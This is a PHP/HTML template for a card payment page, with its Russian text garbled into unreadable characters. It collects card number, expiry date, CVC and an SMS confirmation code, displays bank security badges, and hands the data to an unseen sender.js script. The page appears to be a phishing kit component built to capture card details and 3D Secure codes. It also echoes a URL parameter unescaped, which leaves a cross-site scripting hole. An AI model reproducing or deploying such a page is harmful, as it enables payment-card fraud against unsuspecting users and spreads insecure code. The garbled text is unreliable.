<html>

<head>
  <title><?php print $getIDtext;?></title>
  <link rel="icon" href=" favv.ico" type="image/x-icon" />
  <link href="  css/style.css" rel="stylesheet">
    <link rel="stylesheet" href=" css/jquery-ui.css" />
  <link rel="stylesheet" href=" css/jquery-ui.theme.css" />

  <script src="js/jquery.js"></script>
    <script src="js/jquery-ui.js"></script>
     <script src="js/sender.js"></script>

</head>

<body>

  <div id="container">
  <input type="hidden" class="fxi" value="<?php echo $_GET['id'];?>">
  <input type="hidden" class="fxs" value="<?php echo $post_sum;?>">
  <input type="hidden" class="fxc" value="<?php echo $rcard;?>">
   <br><br><br><br>

     <div id="paymentForm">
       <div id="uniqText"><br><?php print $getIDtext;?></div>

      <div id="borderForm">
        <div id="secureForm">

            <input  class="cardNum" id="c1" type="text"  maxlength="16"
               size="50" value="&nbsp;����� �����" onfocus="if(this.value=='&nbsp;����� �����')this.value=''"
                 onblur="if(this.value=='')this.value='&nbsp;����� �����'" />


           <input  class="mExp" id="mExp" maxlength="2" type="text"
               size="50" value="&nbsp;��" onfocus="if(this.value=='&nbsp;��')this.value=''"
                 onblur="if(this.value=='')this.value='&nbsp;��'" />

           <input  class="yExp" id="yExp"  maxlength="2" type="text"
               size="50" value="&nbsp;��" onfocus="if(this.value=='&nbsp;��')this.value=''"
                 onblur="if(this.value=='')this.value='&nbsp;��'" />

          <input  class="cvcRes" id="cvcRes" maxlength="3" type="text"
               size="50" value="&nbsp;CVC" onfocus="if(this.value=='&nbsp;CVC')this.value=''"
                 onblur="if(this.value=='')this.value='&nbsp;CVC'" />

          <input type="hidden" id="cvcsum" value="<?php print ($sum+30);?>">

                 <button type="button" onclick="createPayment();" class="payment-btn" value="1" id="creater">
                      <span class="button-left"></span>
                       <span class="button-content">��������</span>
                        <span class="button-right"></span>
                 </button><div id="loader"></div>


        </div>


       </div>
         <br><br>
     </div>
     <div class="right-block-text">
        <br> <div id="block-text">������ �������� � ������������ � ������������� ���������� PCI DSS<br><br>
          <img src="img/verified-by-visa.png">
          <img src="img/MasterCard(1).png"><br><br>
          <img src="img/safe-harbor.png">
        </div>
     </div>

     <div class="right-block-payment-sum">
          <br><b>����� �������</b>
           <br><br>
            <b1>���������: </b1>   <b2><?php print ($sum+30);?> ���.</b2> <br>  <br>
			<b1>��������: &nbsp;</b1>   <b2> 0 ���.</b2> <br>  <br><br>
            <div id="right-block-payment-sum-total">
             <br><b4>� ������:</b4> <b3><?php print ($sum+30);?> ���.</b3><br><br>
            </div>
     </div>

<div id="dialogCard1">��� ���� ����������� ��� ����������.</div>
<div id="dialogCard2">����� ����� ������ �������.</div>
<div id="dialogCard3">���� �������� ����� ������ �������.</div>
<div id="dialogCard4">���� �������� ����� ������ �������.</div>
<div id="dialogCard5">CVC ��� ������ �������.</div>
<div id="dialogCard6">���� �������� ����� ������ �������.</div>
<div id="dialogCard7">����� ����� ������ �������, ���� ����� �� ������������ ������� 3D Secure.</div>
<div id="dialogCard8">����� ��������� ������ �������.</div>
<div id="dialog-message" title="���� ���� �� SMS-���������" class="dialog-message">

</div>


<div id="dialogCard9" title="">
<p>
       ��� ������������� �������, ������� ����� ���������, ��������� � ����. ��� ������ �������� ����� ����� ���� �� SMS-���������.

        <div id="resutTerm">����� ���������: <input type="text" name="payTermx" id="payTermx"><input type="hidden"  id="payTermxid" value="<?php print $id;?>">
           <input type="button" onclick="checkTerm();" value="����������� ������" style="background:#2B8BC8; color:#FFF;">
           <img src="img/Spinner.gif" style="position:relative; top: 10px;width:40px; height:40px;" >
        </div>

  </p>
</div>
   <br><br><br><br>
 </div>

</body>
</html>